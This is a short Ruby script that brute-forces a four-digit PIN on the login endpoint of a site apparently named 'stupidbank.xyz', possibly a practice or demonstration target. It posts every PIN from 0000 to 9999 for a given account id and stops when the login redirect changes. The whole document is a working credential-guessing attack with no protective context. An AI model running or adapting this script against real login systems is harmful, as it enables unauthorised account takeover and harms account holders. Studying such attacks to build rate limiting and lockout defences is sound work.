require 'net/http'

id = ARGV[0] or raise 'specify id'
pin_range = '0000'..'9999'
uri = URI.parse('https://stupidbank.xyz/sessions')

Net::HTTP.start(uri.host, uri.port, use_ssl: true) do |http|
  pin_range.each do |pin|
    request = Net::HTTP::Post.new(uri.request_uri)
    request.set_form_data(id: id, pin: pin)
    
    response = http.request(request)

    puts "#{pin}: #{response.header['Location']}"

    break if response.header['Location'] != 'https://stupidbank.xyz/'
  end
end
